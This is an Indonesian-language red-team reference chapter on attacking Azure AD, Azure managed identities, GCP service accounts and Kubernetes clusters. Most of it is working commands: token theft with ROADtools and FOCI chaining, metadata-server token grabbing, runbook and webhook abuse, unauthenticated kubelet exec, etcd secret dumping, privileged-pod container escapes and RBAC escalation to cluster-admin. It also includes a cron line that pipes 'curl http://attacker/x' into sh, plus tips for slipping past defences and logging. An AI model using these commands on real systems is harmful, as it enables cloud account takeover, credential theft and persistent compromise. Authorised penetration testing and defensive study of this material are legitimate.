# azure-gcp-k8s — cloud

# Bab Referensi: Cloud & Container Red Team

## 1. Azure AD Enumeration (ROADtools)

### 1.1 Toolchain & Versi
| Tool | Versi uji | Fungsi |
|---|---|---|
| `roadrecon` | 0.4.x (Python 3.11) | Dump & query Azure AD |
| `roadtx` | 0.3.x | Token acquisition (device code, PRT, FOCI) |
| `AADInternals` | 0.9.x (PS 7.4) | Post-dump object manipulation |
| `TokenTacticsV2` | current | FOCI refresh chain |

### 1.2 Authenticated Dump (user creds + MFA)
```bash
roadrecon auth -u user@tenant.onmicrosoft.com -p 'Password!'
# Muncul: device code prompt, browser auth, JWT cached di %USERPROFILE%\.roadtools\
roadrecon gather
# Output: roadrecon.db (SQLite) — Table: Users, Groups, Applications, ServicePrincipals, RoleAssignments
roadrecon gui   # http://127.0.0.1:5000
```
**Yang dikirim:** OAuth2 request ke `https://login.microsoftonline.com/common/oauth2/v2.0/token` + Graph `/v1.0/*`.
**Yang muncul:** `access_token` untuk Graph (aud=`https://graph.microsoft.com`), `refresh_token` (~90d), PRT bila device-join.
**Kenapa berhasil:** default consent untuk scope `User.Read`, `Directory.Read.All` sering granted tenant-wide. Gagal bila `Security Defaults`/CAP memblokir legacy auth atau `Directory.Read.All` di-revoke pada role default.

### 1.3 Token tanpa Password (FOCI / device code)
```bash
roadtx devicecode --client microsoft.office.core --resource msgraph
# Muncul: user_code + verification_uri, poll sampai sukses
roadtx refreshtokens -r <refresh_token> --client microsoft.azure.authenticator
# Tukar token Office -> Azure CLI -> Teams -> Graph via FOCI family
```
FOCI family yang lazim: `microsoft.office.core`, `microsoft.azure.authenticator`, `1950a258-227b-4e31-a9cf-717495945fc2` (Azure PowerShell), `04b07795-8ddb-461a-bbee-02f9e1bf7b46` (Azure CLI).
**Kenapa berhasil:** token refresh lintas client dalam satu family — aud berbeda, `refresh_token` sama. Gagal bila `foci` di-disable via CA atau `Token Protection` aktif (Win 11 24H2 + Entra ID P1).

### 1.4 Quick Enum Query (SQLite)
```sql
-- Global admins
SELECT u.displayName, u.userPrincipalName FROM Users u
JOIN DirectoryRoles dr ON 1=1
JOIN RoleAssignments ra ON ra.roleObjectId = dr.objectId
WHERE dr.displayName='Global Administrator';
-- Apps dengan consent user
SELECT appDisplayName, scope FROM ServicePrincipalConsents WHERE consentType='AllPrincipals';
```
Buka `roadrecon.db` via `sqlite3 roadrecon.db`.

### 1.5 Roadtx PRT (device-join Windows 11 24H2)
```bash
roadtx prtenrich -r <prt_cookie> --prt-sessionkey <key>
roadtx prtauth -r <prt> --client microsoft.azure.authenticator --resource msgraph
```
PRT diambil via `dsregcmd /status` (harus SYSTEM atau user context) → `AzureAdPrt: YES`.

---

## 2. Managed Identity Abuse (Azure)

### 2.1 Identifikasi dari dalam VM/Container
```bash
# IMDS Azure — hanya dari resource dengan MSI enabled
curl -s -H Metadata:true --noproxy '*' \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# Muncul: { "access_token": "eyJ...", "client_id":"...", "expires_in":"86399" }
```
**Catatan versi:** `api-version=2018-02-01` masih diterima per 2024; `2019-08-01` menambah `client_id` opsional untuk user-assigned.

### 2.2 Enumerasi dari Token
```bash
ACCESS=<token>
# Siapa aku?
curl -s -H "Authorization: Bearer $ACCESS" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"
# Role assignments pada scope saat ini
curl -s -H "Authorization: Bearer $ACCESS" \
  "https://management.azure.com/subscriptions/<sub>/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId eq '<objectId>'"
```
**Kenapa berhasil:** MI default memiliki `Reader` pada RG-nya; sering over-grant `Contributor` pada subscription untuk convenience. Gagal bila `Azure RBAC` di-scope sempit dan CA memblokir token MI yang di-forward ke luar (audience check `xms_mirid` claim).

### 2.3 Eskalasi via Azure Resource
| Teknik | Endpoint | Efek |
|---|---|---|
| Runbook Automation Account | `Microsoft.Automation/automationAccounts/runbooks` (published) | Eksekusi kode sebagai MI Automation |
| Webhook Automation | `.../webhooks/{name}` | Trigger tanpa auth header, `?token=` di URL |
| Logic App HTTP trigger | `Microsoft.Logic/workflows/triggers/manual` | Sama; MI tenant bisa dipanggil lintas sub |
| Function App | `Microsoft.Web/sites/functions` | Kode panggil MI Function |
| AKS cluster `kubeletidentity` | `Microsoft.ContainerService/managedClusters` | MI untuk kubelet, akses ACR |

### 2.4 Runbook Abuse (Automation Accountковая)
```bash
# 1. List runbooks — perlu Microsoft.Automation/automationAccounts/runbooks/read
curl -s -H "Authorization: Bearer $ACCESS" \
 "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Automation/automationAccounts/$AA/runbooks?api-version=2023-11-01"

# 2. Publish + start runbook dengan parameter (kalau sudah ada runbook yang echo param)
curl -s -X PUT -H "Authorization: Bearer $ACCESS" -H "Content-Type: application/json" \
 "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Automation/automationAccounts/$AA/runbooks/$RB/draft/publish?api-version=2023-11-01"

curl -s -X PUT -H "Authorization: Bearer $ACCESS" -H "Content-Type: application/json" \
 -d '{"properties":{"runOn":"","parameters":{"x":"id"}}}' \
 "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Automation/automationAccounts/$AA/jobs/$JOB?api-version=2023-11-01"
```
**Yang dikirim:** PUT job JSON; **yang muncul:** `jobId`, `status: Running`. Output job di `.../jobs/$JOB/output?api-version=2023-11-01`.
**Kenapa berhasil:** akun Automation sering punya `Contributor` di subscription untuk provisioning; MI account tsb. diwariskan ke runbook. **Gagal bila:** runbook berbasis hybrid worker (bukan Azure sandbox) → eksekusi di on-prem, tidak ada MI cloud; atau `Automation Account` di-deploy dengan `Identity: None`.

### 2.5 Webhook Trigger
```bash
# Ambil URL webhook (sensitive — muncul plain bila caller punya read pada webhook)
curl -s -H "Authorization: Bearer $ACCESS" \
 "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Automation/automationAccounts/$AA/webhooks?api-version=2023-11-01"
# POST tanpa Auth header
curl -s -X POST "https://<region>.webhook.azure-automation.net/webhooks?token=<token>" \
 -H "Content-Type: application/json" -d '{"param":"x"}'
```
**Kenapa berhasil:** webhook adalah bearer-URL — siapa pun dengan URL menjalankan runbook sebagai MI. **Gagal bila:** expired (default 1 tahun), atau runbook menerima param terikat `RunAs` tertentu.

---

## 3. GCP Metadata & Service Account Impersonation

### 3.1 Metadata Server
```bash
# Token SA default dari GCE/GKE/GCF/GCR
curl -s -H "Metadata-Flavor: Google" \
 "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# {"access_token":"ya29...","expires_in":3599,"token_type":"Bearer"}

# Identitas instance
curl -s -H "Metadata-Flavor: Google" \
 "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"

# SSH keys di project metadata
curl -s -H "Metadata-Flavor: Google" \
 "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"

# Kubelet / GKE: cek workload identity
curl -s -H "Metadata-Flavor: Google" \
 "http://metadata.google.internal/computeMetadata/v1/instance/attributes/cluster-name"
```
**Kenapa berhasil:** metadata server tak bisa di-reach dari luar 169.254.169.254; di dalam workload dengan `metadata concealment` off (GKE default pre-1.29 kecuali di-enable) → SA default directly accessible.
**Gagal bila:** GKE Workload Identity enabled → `default` SA hanya punya `roles/container.defaultNodeServiceAccount`; `--metadata=disable-legacy-endpoints=true` (default sejak 2021) memaksa `Metadata-Flavor` header.

### 3.2 SA Impersonation Chain
```bash
# Siapa aku (nanti pass ke gcloud auth)
gcloud auth activate-service-account --key-file=sa.json
gcloud config list
# Token exchange
curl -X POST "https://oauth2.googleapis.com/token" \
 -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
 -d "assertion=$(gcloud auth print-identity-token)"
```
**IAM role yang dibutuhkan:** `roles/iam.serviceAccountTokenCreator` pada target SA.
```bash
gcloud iam service-accounts get-iam-policy target@proj.iam.gserviceaccount.com
# Members: user:me@x.com   role: roles/iam.serviceAccountTokenCreator

# Impersonate
gcloud auth print-access-token --impersonate-service-account=target@proj.iam.gserviceaccount.com
# Atau langsung via API
curl -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
 "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/target@proj.iam.gserviceaccount.com:generateAccessToken" \
 -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}'
```
**Kenapa berhasil:** `iam.serviceAccounts.actAs` (untuk resource deploy) dan `iam.serviceAccounts.getAccessToken` (untuk token langsung) sering ter-grant luas lewat `roles/editor` di project — Editor **tidak** punya getAccessToken (sejak 2022) tetapi punya `actAs`. Project `owner` pasti sukses.
**Gagal bila:** `iam.serviceAccounts.getAccessToken` di-revoke dari Editor via org policy; atau `Workload Identity Federation` memblokir user-SA binding lintas project.

### 3.3 Metadata Flag Abuse (GKE)
```bash
# Dari dalam pod GKE
curl -s -H "Metadata-Flavor: Google" \
 "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://container.googleapis.com/&format=full"
# -> JWT dengan aud container API — dipakai untuk call GKE API bila node SA punya role
```
**Kenapa berhasil:** audience default `kubernetes.io` atau `container.googleapis.com` di-preserve untuk node SA. Bila node SA diberi `roles/container.clusterViewer` → cluster-info bocor.

---

## 4. Kubernetes

### 4.1 Anonymous API (v1.20+ `--anonymous-auth=true` default historical)
```bash
# Cek anon access ke API server
curl -k https://<apiserver>:6443/api
curl -k https://<apiserver>:6443/api/v1/namespaces
curl -k https://<apiserver>:6443/version
```
**Yang dikirim:** GET tanpa `Authorization`. **Yang muncul:** `{"kind":"APIVersions",...}` jika anon diizinkan (legacy kubelet, kubeadm <1.22 tanpa RBAC ketat, managed cluster tak seharusnya).
Versi: sejak K8s 1.22 `--anonymous-auth` tidak lagi default `true` di kubelet; API server makin sering `--anonymous-auth=false` + `system:anonymous` di-bind ke `system:discovery` saja.
**Gagal bila:** `RBAC` bind `system:unauthenticated` dihapus (default managed: AKS/GKE/EKS mengembalikan 401).

### 4.2 Kubelet 10250 Exec
```bash
# Cek
curl -k https://<node-ip>:10250/pods
# Unauthenticated exec (kubelet --anonymous-auth=true legacy / --authorization-mode=AlwaysAllow)
curl -k -X POST "https://<node-ip>:10250/run/<ns>/<pod>/<container>" \
 -d "cmd=id"
# {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Success"}
# session command streaming:
curl -k "https://<node-ip>:10250/exec/<ns>/<pod>/<container>?output=1&error=1&command=/bin/sh&command=-c&command=id"
```
**Kenapa berhasil:** kubelet port 10250 tanpa authz (default kubeadm pre-1.19 `AlwaysAllow`, atau `--anonymous-auth=true`). **Gagal bila:** `--authorization-mode=Webhook` (default managed cluster) → butuh bearer token atau client cert dengan RBAC `nodes/proxy` & `pods/exec`; kubelet 10255 read-only ports juga ditutup sejak 1.23.

### 4.3 Etcd Direct
```bash
# Etcd 2379 — tanpa client cert bila --client-cert-auth=false
etcdctl --endpoints=https://<node>:2379 --insecure-skip-tls-verify \
  get / --prefix --keys-only | head
# Ambil SA token dari secrets
etcdctl --endpoints=https://<node>:2379 --insecure-skip-tls-verify get \
  /registry/secrets/kube-system/<sa-token-secret> --print-value-only | strings | grep -A1 token
```
**Yang muncul:** protobuf → token JWT SA (base64 di dalam value). Decode bypass: `strings` cukup untuk JWT `eyJ...`.
**Kenapa berhasil:** etcd default listen `127.0.0.1:2379` sejak 1.10 — hanya terekspos jika kubeadm `--listen-client-urls` diubah atau etcd di-host terpisah dengan firewall longgar. **Gagal bila:** `--client-cert-auth=true` (default kubeadm) → butuh cert `/etc/kubernetes/pki/etcd/server.crt`.

### 4.4 Token di Pod
```bash
# Default mount (pre-1.24) — automount SA token = token permanen
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# 1.24+ projected token (aud=kubernetes.default, ~1h, auto-rotate)
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export APISERVER=https://kubernetes.default.svc
curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
 -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)/pods
```
**Deteksi versi token:** `kubectl version --short` di node, atau `jq -R 'split(".")[1]|@base64d|fromjson' token` → `aud` field. Token projected punya `kubernetes.io` aud; token legacy aud=`null`.
**Yang dikirim:** Bearer JWT; **yang muncul:** 200 dengan payload RBAC. **Gagal bila:** `automountServiceAccountToken: false`, atau `BoundServiceAccountTokenVolume` (default 1.24+) rotate tiap 24h — token bocor cepat mati.

### 4.5 Privileged / hostPath / hostPID Escape

#### 4.5.1 Privileged + hostPID → nsenter
```bash
# Dalam pod privileged dengan hostPID: true
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# Atau tanpa nsenter:
cat /proc/1/root/etc/shadow      # host filesystem
cat /proc/1/root/etc/kubernetes/admin.conf  # kubelet admin kubeconfig bila control-plane
```
**Contoh manifest minimal:**
```yaml
apiVersion: v1
kind: Pod
metadata: {name: pwn}
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: c
    image: alpine:3.20
    securityContext: {privileged: true}
    command: ["sleep","infinity"]
```
**Kenapa berhasil:** privileged container = semua caps + `/dev/*` host. hostPID → PID namespace host terlihat, `/proc/1/root` = host fs. Tipe khusus: escape ke node dengan `/proc/1/root/etc/kubernetes/pki/*` → ambil `ca.key` → forge client cert `system:masters`.
**Gagal bila:** `PodSecurityAdmission` level `restricted`/`baseline` (default 1.25+ dengan label `pod-security.kubernetes.io/enforce`) menolak `privileged: true` di ns berlabel; OPA Gatekeeper/Kyverno policy; AKS `--enable-policy=azure` mencegah `hostPath` & privileged di ns tertentu.

#### 4.5.2 hostPath → host FS RW
```yaml
spec:
  containers:
  - name: c
    image: alpine
    volumeMounts: [{name: h, mountPath: /host}]
  volumes:
  - name: h
    hostPath: {path: /, type: Directory}
```
```bash
# Tulis authorized_keys ke host/node
chroot /host /bin/bash -c 'echo "ssh-ed25519 AAAA..." >> /root/.ssh/authorized_keys'
# Atau cron persistence
echo '* * * * * root curl http://attacker/x | sh' > /host/etc/cron.d/x
```
**Kenapa berhasil:** hostPath tak dibatasi path — `/`, `/var/lib/kubelet`, `/var/lib/docker`, `/var/log`, `/etc/kubernetes` klasik. Via `/var/lib/kubelet` bisa dapat kubelet kubeconfig → `system:node`.
**Gagal bila:** admission webhook menolak `hostPath`, atau kubelet `--allow-privileged=false` + `hostPath` block di managed cluster (GKE Autopilot, AKS restricting `hostPath` di ns tertentu).

#### 4.5.3 hostNetwork + kubelet impersonation
```yaml
spec:
  hostNetwork: true
  containers: [{name: c, image: alpine, securityContext: {privileged: true}}]
```
→ akses localhost:10250 kubelet dari pod, eksekusi `curl -k https://127.0.0.1:10250/pods` dengan token node.

### 4.6 RBAC Escalation Paths

| Privesc | Role yg dibutuhkan | Cara |
|---|---|---|
| Bikin admin | `create rolebindings` di namespace | bind `cluster-admin` ke SA sendiri (jika `escalate`/`bind` verb di rolebinding object dimiliki) |
| Baca semua SA token | `get secrets` cluster-wide | `kubectl get secrets -A -o json \| jq '.items[] \| select(.type=="kubernetes.io/service-account-token")'` |
| Exec ke admin pod | `pods/exec` | exec ke `kube-apiserver` atau `kube-controller-manager` pod → baca flag `--service-account-key-file` |
| Impersonate | `impersonate` pada user/group/SA | `kubectl --as=system:admin --as-group=system:masters get pods` |
| Node proxy | `nodes/proxy` | `curl -k https://<node>/api/v1/nodes/<node>/proxy/...` -> kubelet API sebagai kubelet creds |
| Escalate SA | `escalate` di ClusterRole | modify role sendiri / bind CRB |

Contoh chained:
```bash
# 1. role dengan verb create rolebindings di ns
kubectl auth can-i create rolebindings -n target
# 2. CRB ke cluster-admin
kubectl create rolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:pwn -n target
# 3. token
kubectl -n target create token pwn
```
**Kenapa berhasil:** verb `bind`/`escalate` sering tergrant tanpa sadar via `edit`/`admin` built-in ClusterRole. `escalate` di ClusterRole memberi hak untuk meng-create/meng-update role apa pun di atasnya.
**Gagal bila:** RoleBinding dengan `bind` dihapus; OPA policy memblok `cluster-admin` binding; atau namespace `target` tidak mengizinkan `escalate` di role baru.

### 4.7 RBAC Enumerasi Cepat
```bash
# Cek hak di semua ns
kubectl auth can-i --list -n default
# Self subject rules, rekursif
kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.name|test("sa|default"))'
# Role yang punya escalate/bind
kubectl get clusterroles,roles -A -o json | jq '.items[] | select(.rules[]?.verbs[]? | . == "escalate" or . == "bind")'
# Siapa bisa bikin rolebinding
kubectl auth can-i create rolebindings --as=system:serviceaccount:default:default -n kube-system
```

### 4.8 Token Theft Post-Compromise
```bash
# Rotasi manual bypass via create token (1.24+)
kubectl -n kube-system create token default --duration=87600h  # 10 tahun
```
**Catatan:** `create token` masih dibatasi RBAC `serviceaccounts/token`, tapi bila punya `create serviceaccounts/token` → SA token jangka panjang yang diinginkan.

---

## 5. Jebakan Operasional (Field-failure)

| # | Jebakan | Gejala / mitigasi |
|---|---|---|
| 1 | **Roadrecon token expiry di tengah gather** | Graph 429/401 setelah ~30 menit. Gunakan `--refresh-interval 5` + resume via `roadrecon gather --db roadrecon.db --resume`. |
| 2 | **FOCI mati karena `Continuous Access Evaluation` (CAE)** | Token di-revoke saat network change / password reset. Cek `xms_cc: cp1` dan `evaluation` event di `entra sign-in logs`. Wajib token refresh cepat. |
| 3 | **Azure IMDS latency 169.254.169.254 di container** | Container `--net=none` atau istio sidecar dengan iptables redirect → `169.254.169.254` tak terjangkau. Cek `ip route`, coba `--noproxy '*'` untuk curl, atau `http_proxy` env yang mencegat. |
| 4 | **MI token audience mismatch** | Token untuk `management.azure.com` tidak valid untuk `graph.microsoft.com`/`vault.azure.net`. Harus `resource=` beda. Log: `AADSTS50013` atau `AudienceNotSupported`. |
| 5 | **Runbook Automation sandbox = `Azure` tapi paket external blocked** | `pwsh` runbook tanpa module `Az` → gagal call MI. Cek `job.output` — sering muncul `Module not found`. Gunakan `Python 3.8` runbook atau upload module dulu. |
| 6 | **Automation webhook expired** | Default 1 tahun; token di URL 401 begitu expire. `Get-AzAutomationWebhook` tidak bisa retrieve — harus reset. |
| 7 | **GCP Workload Identity memblok metadata SA** | `metadata.google.internal` returns 403 `Forbidden`. Cek `kubectl get sa <ns>:<sa> -o yaml` → `iam.gke.io/gcp-service-account` annotation. Fallback butuh `gcloud auth application-default` tak akan ada. |
| 8 | **`generateAccessToken` ditolak dengan `iam.serviceAccounts.getAccessToken`** | Editor/Viewer tidak lagi punya verb tsb (sejak 2022). Cek `gcloud iam service-accounts get-iam-policy` per-SA, bukan project policy. |
| 9 | **Kubelet 10250 `Webhook` authz** — 401 `Unauthorized` | Managed cluster (AKS/GKE/EKS) memakai webhook. Butuh bearer token dengan `system:node` atau exec token di pod. Port 10250 hanya bisa di-reach dari node's pod network / hostNetwork. |
| 10 | **Etcd 2379 unreachable dari pod** | kubeadm set `listen-client-urls=https://127.0.0.1:2379` + `client-cert-auth=true`. Perlu hostNetwork + privileged + host `/etc/kubernetes/pki/etcd/*.crt` (dari hostPath). |
| 11 | **PodSecurityAdmission `restricted`** (default 1.25+ dengan label) | `privileged: true` rejected: `violates PodSecurity "restricted:latest"`. Cari ns tanpa label (`kube-system` sering masih `privileged` di managed cluster — coba `kubectl -n kube-system run`). |
| 12 | **`automountServiceAccountToken: false`** | `cat token` → `No such file or directory`. Cek via `kubectl get pod -o yaml` → bypass tak mungkin; cari sidecar/initContainer yang masih mount. |
| 13 | **BoundServiceAccountTokenVolume expiry** | Token 1h, aud=`kubernetes.default` — tak bisa pakai ke API server luar cluster; refresh loop butuh file mount. |
| 14 | **`kubectl create token --duration` max 1 tahun** — bukan lifetime token | Default `24h`, max `87600h` di 1.30+; pre-1.24 pakai `secrets` (permanent) — cek `--bound-object-...` di `create token`. |
| 15 | **RBAC `escalate` hilang setelah edit `ClusterRole`** | `system:masters` bukan role, tidak ter-bind ke CRB; rolebuiltin `cluster-admin` punya `escalate` — jangan expect `edit` punya `bind` di CRB. Cek `kubectl describe clusterrole <role>`. |
| 16 | **hostPath mount ditolak di AKS/GKE Autopilot** | Error `forbidden: hostPath`. GKE Autopilot blok total; AKS butuh `--enable-...` / ns whitelist di `--enable-policy` policy addon. |
| 17 | **`nsenter` gagal karena `hostPID` false** | PID 1 tetap container. `/proc/1/root` = container root. Cek `readlink /proc/self/ns/pid` vs `readlink /proc/1/ns/pid`. |
| 18 | **Node `system:node` credential rotation 90 hari** | Cert di `/var/lib/kubelet/pki/kubelet-client-current.pem` di-rotate otomatis; eksfiltrasi butuh refresh sebelum lewat. |
| 19 | **AKS `kubeletidentity` vs `clusterIdentity`** | VMSS MSI ≠ control plane MSI. `kubeletidentity` untuk ACR pull; `clusterIdentity` untuk load balancer & subnet. Salah audience = 403 di `management.azure.com`. |
| 20 | **Cloud metadata header strict** | AWS `X-aws-ec2-metadata-token` (IMDSv2) vs GCP `Metadata-Flavor: Google` vs Azure `Metadata:true`. Salah header = 400, bukan 200. IMDSv2 default di EC2 baru sejak 2024 — jangan asumsi v1. |
| 21 | **`kubectl --as=system:admin` ditolak** | Butuh `impersonate` verb pada `users`/`groups` — tidak ada di role default. `kubectl auth can-i impersonate users` cek cepat. |
| 22 | **CAE + FOCI token refresh dari IP berbeda** | Entra ID trigger re-auth (block). Gunakan IP konsisten atau `--tenant` sama + device-bound PRT bila device-join. |
| 23 | **Logging menangkap token via Graph `/auditLogs`** | User-access token FOCI menghasilkan `signIn` log per resource. Rate limit `Throttling: 429` → backoff 30s. |
| 24 | **Token di URL webhook = sering ke-log di Application Insights / Azure Monitor** | Webhook URI 401 setelah token rotation atau `sensitive: true` param filter aktif. Cek `diagnostic settings` sebelum ekspl. |
| 25 | **`curl --noproxy '*'` vs `HTTP_PROXY` container** | Proxy intercept `169.254.169.254` → 403 dari proxy. Wajib `--noproxy '*'`, atau hapus env `http_proxy`/`https_proxy` dan `NO_PROXY=169.254.169.254,metadata.google.internal`. |

---

## [reasoning trace]


